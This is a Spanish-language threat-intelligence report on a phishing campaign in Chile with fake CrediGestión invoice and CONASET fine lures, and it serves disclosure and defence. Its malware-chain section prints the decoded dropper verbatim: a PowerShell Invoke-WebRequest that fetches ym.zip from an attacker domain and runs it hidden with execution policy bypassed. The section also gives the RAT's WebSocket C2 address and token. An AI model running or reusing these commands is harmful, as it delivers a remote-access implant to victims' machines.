@@ -1,0 +1,199 @@
+Campaña: Phishing 2ª oleada "legalnorte.cl" — señuelos CrediGestión (factura vencida) + CONASET (multa de tránsito)
+Detección: 2026-08-31 (correo CrediGestión) y 2026-09-01 (correo CONASET) | Región: Chile | Sector: PYME
+Tipo: Robo de credenciales (credential harvesting) + entrega de malware (RAT en PowerShell)
+Confianza: Alta | Análisis: Intellroom · Threat Intelligence | TLP:CLEAR (IOCs)
+Nota de privacidad: se OMITE la identidad de la organización receptora (víctima) — "PYME chilena, identidad redactada".
+
+===============================================================================
+RESUMEN
+===============================================================================
+Continuación de la campaña "CrediGestión Factura Vencida" (ver ../CrediGestion_FacturaVencida).
+El operador movió el landing de nitrollanta[.]com a un nuevo sitio chileno comprometido, legalnorte[.]cl,
+y AMPLIÓ el repertorio de señuelos con una segunda marca suplantada: CONASET / Ministerio de Transportes
+(falsa multa de tránsito). Ambos correos salen de sitios legítimos DISTINTOS comprometidos en hosting
+Nexcess/Liquid Web, mediante scripts PHP inyectados, y enlazan a un único kit alojado en legalnorte[.]cl.
+
+CAMBIO CLAVE RESPECTO A LA 1ª OLEADA: esta oleada SÍ entrega malware. En equipos de ESCRITORIO el kit
+redirige a un ZIP con un acceso directo (.lnk) que lanza PowerShell oculto, descarga una segunda etapa
+(hnjixiao[.]com/ym.zip → ripxl.ps1) y ejecuta un RAT en PowerShell con C2 por WebSocket (mybia2rap[.]com:8080),
+persistencia por clave Run + init.vbs, captura de pantalla y COSECHA de listas de correo desde Outlook/Graph.
+Esa cosecha de correos es, muy probablemente, lo que realimenta las siguientes oleadas de spam.
+
+En equipos MÓVILES el flujo es un callejón sin salida (redirect a "https://aboutblank"): por eso el correo
+CONASET insiste en "no disponible en móviles, revise desde un computador" — obliga al escritorio para poder
+entregar el binario.
+
+===============================================================================
+LÍNEA DE TIEMPO (según cabeceras)
+===============================================================================
+2026-08-31 16:25 UTC  Correo "fac" (CrediGestión) desde support@doyourbestcoaching.com (192.190.221.127)
+2026-08-31 12:46 (svr) Directorio regularice/ creado en legalnorte.cl (open index)
+2026-09-01 09:35 (svr) database.sqlite del kit actualizado (410 registros de captura)
+2026-09-01 12:13 GMT  VisorCredGestionxFactx.zip (payload) publicado en bangsamoro.gov.ph
+2026-09-01 13:38 (svr) regularice.zip (kit empaquetado) queda expuesto en el open index
+2026-09-01 16:50 UTC  Correo "Informe Online...multas" (CONASET) desde support@stopautoleaks.com (8.29.155.51)
+2026-09-03 (análisis)  Kit landing /regularice/ responde 404 (removido), pero directorios y regularice.zip siguen 200
+
+===============================================================================
+CORREO 1 — CrediGestión (factura vencida)
+===============================================================================
+From:        "CrediGestión" <support@doyourbestcoaching.com>
+Subject:     fac
+Message-ID:  <ef7726e7309724ea2a5bf3858482711f@doyourbestcoaching.com>
+Fecha:       Mon, 31 Aug 2026 16:25:11 +0000
+IP emisora:  192.190.221.127  (cloudhost-4238223.us-midwest-2.nxcli.net — Liquid Web / Nexcess, US)
+X-PHP-Originating-Script: 10033:index.php   (correo lanzado por PHP inyectado en el sitio)
+SPF:         pass para doyourbestcoaching.com (enviado por su propia infra comprometida)
+Señuelo:     "Factura CrediGestión" · Total a pagar 299.100 · "Vencido !!!" · corte 10-09-2026 · amenaza legal
+Enlace:      hxxps://legalnorte[.]cl//CrediGestion/FactVencida/regularice/?hash=<email_victima>
+
+===============================================================================
+CORREO 2 — CONASET (multa de tránsito)
+===============================================================================
+From:        "CONASET - Información" <support@stopautoleaks.com>
+Subject:     Informe Online sobre multas y sanciones de transito 32618696476394916905500
+Message-ID:  <2a377a43425c6154b2ebc96070025620@stopautoleaks.com>
+Fecha:       Tue, 1 Sep 2026 16:50:05 +0000
+IP emisora:  8.29.155.51  (cloudhost-1647979.us-midwest-1.nxcli.net — Level3 / Nexcess, US)
+             -> listada en HOSTKARMA-BLACK
+X-PHP-Originating-Script: 10000:pjvz55ss_mlr.php   (mailer PHP inyectado)
+DKIM/DomainKey: firmado d=stopautoleaks.com pero DKIM_INVALID
+Señuelo:     Suplanta "CONASET / Ministerio de transportes"; folio F-2026-1108026; "exceso de velocidad";
+             monto en mora $186.420; plazo 11-09-2026; "restricciones operativas al vehículo".
+             Diseño imita colores institucionales (barra azul/rojo tipo bandera). Dirigido a "responsable de flota".
+Truco:       "la visualización no está disponible en dispositivos móviles. Debe revisarse desde un computador."
+             -> fuerza el escritorio, que es donde el kit entrega el payload.
+Enlace:      hxxps://legalnorte[.]cl//Conaset/infraccione/pendiente/regularice/regularice/?hash=<email_victima>
+
+===============================================================================
+INFRAESTRUCTURA
+===============================================================================
+Landing (kit) — SITIO LEGÍTIMO COMPROMETIDO:
+  legalnorte[.]cl  ->  200.73.115.81  (PowerHost Telecom SPA, Chile) · servidor LiteSpeed
+  Dominio creado 2011-08-22, con MX de Google Workspace  => negocio real chileno hackeado (no del atacante).
+  Open directory activo: /CrediGestion/FactVencida/ lista regularice/ y regularice.zip (el kit empaquetado).
+  Estado al análisis: /regularice/ (página final) = 404 (removida); directorios y regularice.zip = 200.
+
+Sitios emisores — LEGÍTIMOS COMPROMETIDOS (hosting Nexcess/Liquid Web, envío por PHP inyectado):
+  doyourbestcoaching[.]com -> 192.190.221.127 (ns*.nexcess.net)
+  stopautoleaks[.]com      -> 8.29.155.51 (ns*.worldnic.com)
+
+Payload etapa 1 — alojado en SITIO GUBERNAMENTAL COMPROMETIDO:
+  hxxps://sbmis-mbhte[.]bangsamoro[.]gov[.]ph//e-commerce/mondaysun/VisorCredGestionxFactx.zip
+  (portal del gobierno de Bangsamoro, Filipinas; tras Cloudflare; 1.174 bytes; contiene un .lnk)
+
+Etapa 3 + C2 — DOMINIOS DEL ATACANTE (tras Cloudflare):
+  hnjixiao[.]com     -> 104.21.47.95 / 172.67.146.99   (aloja ym.zip → ripxl.ps1)
+  mybia2rap[.]com    -> 172.67.166.244 / 104.21.16.82  (C2:  ws://mybia2rap[.]com:8080 , token Yl3kbbb0955F)
+  credigestion[.]biz -> 34.174.141.125 (GCP)           (lookalike de la marca, referenciado en index.php)
+  kenyasafarideals[.]com                                (redirect de respaldo en go.php, sitio comprometido)
+
+===============================================================================
+KIT DE PHISHING (regularice.zip) — análisis estático
+===============================================================================
+SHA256 c790f4bfdb9c243c3081bac0e681ddb0527e16558a51bf5f7ce45f55dccdf0b6  |  MD5 715dd6c165625204b9a87b627a694032
+Contenido: index.php (página falsa), panel.php (panel del operador), antibot.php (cloaking), go.php/download.php
+(redirecciones), config.php, .htaccess (~236 KB, gran lista de bloqueo/cloaking), data/database.sqlite y un
+kit anidado VAI-REDIR-VAI.zip (copia del mismo kit).
+
+config.php:
+  allowed_countries = ["CL"]                          -> geocercado SOLO a Chile
+  redirect_mobile   = "https://aboutblank"            -> móvil = callejón sin salida
+  redirect_desktop  = ".../VisorCredGestionxFactx.zip"-> desktop = descarga el payload
+  timezone          = "America/Sao_Paulo"             -> señal de operador de zona Brasil
+antibot.php: bloquea bots, crawlers, buscadores, y hosts de amazonaws/digitalocean/vultr/ovh/hetzner/vpn/proxy;
+  exige cabeceras Accept y Accept-Language -> evasión de sandboxes y de análisis automatizado.
+data/database.sqlite: tabla logs = 410 registros de captura (columnas: data, ip, pais, uf, cidade, device,
+  host, email, status). Los nombres de columna en portugués ("uf","cidade") refuerzan el origen brasileño del kit.
+  NOTA DE PRIVACIDAD: NO se extrajeron ni se publican los datos de las víctimas — solo el esquema y el conteo.
+
+===============================================================================
+CADENA DE MALWARE (desktop)
+===============================================================================
+1) Kit (desktop) -> descarga  VisorCredGestionxFactx.zip  (de bangsamoro.gov.ph)
+   SHA256 be5920b8c54b27c245dcee1a1c92ade4bf10d1ca6968193c3a9c8ab7643e3b60
+2) El ZIP contiene  VisorCredGestionxFactx.lnk  (3.220 B), un acceso directo a:
+   powershell.exe -ExecutionPolicy Bypass -EncodedCommand <base64 UTF-16>
+   (icono señuelo: C:\Users\Public\Documents\ico.ico ; SID del constructor: S-1-5-21-1714787112-1154861253-1508225144-1004)
+3) El comando decodificado:
+     $mic17 = "c:\users\public\documents\ripxl.ps1"
+     $xip9  = "https://hnjixiao.com/ym.zip"
+     Invoke-WebRequest -Uri $xip9 -OutFile $mic17
+     powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Public\Documents\ripxl.ps1"
+4) ym.zip NO es un ZIP: es un script PowerShell de ~2,3 MB (se guarda como ripxl.ps1 y se ejecuta oculto).
+   SHA256 55d8a634d10bad022df2458cee744be1032ed316870c512fdaf6c10cb7ddf0ed
+   ripxl.ps1 = RAT / implante de acceso remoto en PowerShell:
+     - C2:  ws://mybia2rap.com:8080  (WebSocket), token "Yl3kbbb0955F"; reconexión y métricas.
+     - Captura de pantalla en streaming (parámetros ScreenFPS / ScreenQuality).
+     - Persistencia: crea init.vbs (wscript ejecuta ripxl.ps1) y clave Run "WindowsSystem" en HKCU.
+     - Suprime la salida (redefine Write-Host) para operar en silencio.
+     - Función "PegaLista": cosecha listas de correo vía Outlook clásico o Microsoft Graph.
+     - Geolocaliza con ip-api.com/json?lang=pt-BR (parámetro de idioma portugués).
+     - Comentarios en portugués en todo el código ("VBS criado com sucesso", "Registro criado com sucesso").
+   Artefactos en disco: C:\Users\Public\Documents\{ripxl.ps1, init.vbs, ico.ico, out.txt, sil.txt, bloq.txt,
+     removerx.bat, rmm-update.bat}.
+
+===============================================================================
+ATRIBUCIÓN
+===============================================================================
+Operador muy probablemente de habla portuguesa / zona Brasil (crimeware LATAM): timezone America/Sao_Paulo en
+config.php, columnas del SQLite en portugués, comentarios del RAT en portugués, ip-api con lang=pt-BR y el
+placeholder "email@exemplo.com" en panel.php. TTP = phishing de credenciales + dropper LNK→PowerShell→RAT,
+con abuso de marcas locales chilenas (CrediGestión ficticia; CONASET real). Sin más pivotes no se atribuye a
+una campaña nombrada; la combinación LNK+PowerShell+RAT+cosecha de Outlook es coherente con el ecosistema de
+troyanos/loaders bancarios de la región. Se evita afirmar un nombre de familia sin muestra confirmada.
+
+===============================================================================
+LO QUE NO ES UN IOC (evitar daño colateral)
+===============================================================================
+- legalnorte[.]cl, doyourbestcoaching[.]com, stopautoleaks[.]com, kenyasafarideals[.]com y
+  sbmis-mbhte[.]bangsamoro[.]gov[.]ph son SITIOS LEGÍTIMOS COMPROMETIDOS (víctimas colaterales).
+  Acción: bloquear la URL/ruta específica y reportar al dueño y a su hosting; NO tumbar el dominio completo.
+- ip-api.com es un servicio legítimo de geolocalización usado POR el kit; no es infraestructura del atacante.
+- Las IPs 104.21.x / 172.67.x son de Cloudflare (fronting de hnjixiao/mybia2rap): el IOC es el DOMINIO, no la IP.
+- 200.73.115.81 (PowerHost) y 192.190.221.127 / 8.29.155.51 (Nexcess) son hosting compartido -> no bloquear la IP.
+- El MX *.aspmx.l.google.com de legalnorte.cl es el correo legítimo del negocio comprometido.
+
+===============================================================================
+MITRE ATT&CK
+===============================================================================
+T1583.001 Acquire Infrastructure: Domains        (hnjixiao.com, mybia2rap.com, credigestion.biz)
+T1584.004 Compromise Infrastructure: Server      (múltiples sitios legítimos comprometidos, incl. gov.ph)
+T1608.005 Stage Capabilities: Link Target        (kit alojado en legalnorte.cl)
+T1608.001 Stage Capabilities: Upload Malware     (payload en bangsamoro.gov.ph)
+T1656     Impersonation                           (abuso de marcas "CrediGestión" y "CONASET")
+T1566.002 Phishing: Spearphishing Link
+T1204.001 User Execution: Malicious Link
+T1204.002 User Execution: Malicious File          (.lnk)
+T1059.001 Command and Scripting Interpreter: PowerShell
+T1059.005 Command and Scripting Interpreter: Visual Basic  (init.vbs vía wscript)
+T1027.010 Obfuscated Files or Information: Command Obfuscation  (-EncodedCommand base64)
+T1105     Ingress Tool Transfer                   (Invoke-WebRequest ym.zip)
+T1547.001 Boot or Logon Autostart Execution: Registry Run Keys  ("WindowsSystem")
+T1497     Virtualization/Sandbox Evasion          (antibot.php: bloquea VPS/datacenter/vendors)
+T1113     Screen Capture                          (RAT: streaming de pantalla)
+T1114.001 Email Collection: Local Email Collection      (Outlook clásico)
+T1114.002 Email Collection: Remote Email Collection     (Microsoft Graph)
+T1071     Application Layer Protocol               (C2 por WebSocket, puerto 8080)
+
+===============================================================================
+RECOMENDACIONES
+===============================================================================
+- Bloquear por DNS/proxy: hnjixiao[.]com, mybia2rap[.]com, credigestion[.]biz (dominios del atacante).
+- Bloquear las URLs/rutas específicas del kit y del payload (ver iocs.txt); reportar a los dueños y hostings
+  de los sitios comprometidos (incl. abuse de Nexcess/Liquid Web, PowerHost y del portal gov.ph).
+- EDR: alertar sobre powershell.exe con -EncodedCommand lanzado desde un .lnk, IWR a hnjixiao[.]com,
+  ejecución de C:\Users\Public\Documents\ripxl.ps1 y la clave Run "WindowsSystem".
+- Correo: reglas por remitente/asunto/Message-ID y por el patrón ?hash=<email> hacia legalnorte[.]cl.
+- Ante clic + descarga/ejecución: aislar el equipo, eliminar los artefactos de C:\Users\Public\Documents\,
+  quitar la clave Run, rotar credenciales (correo/Outlook), y revisar reglas/forwarders de la casilla
+  (la cosecha de listas de Outlook es el motor de las próximas oleadas).
+- 2FA obligatorio en correo/webmail; capacitar sobre "facturas/multas vencidas" con urgencia y amenaza.
+
+===============================================================================
+CAMPAÑA RELACIONADA
+===============================================================================
+1ª oleada, mismo operador/lure CrediGestión, landing distinto (nitrollanta[.]com) y SIN payload:
+  ../CrediGestion_FacturaVencida  (28082026)
+Corrección respecto a esa ficha: aquella concluyó "no entrega ejecutable / no es troyano". Sigue siendo cierto
+para ese vector; ESTA oleada, en cambio, SÍ entrega malware (RAT PowerShell) en el camino de escritorio.
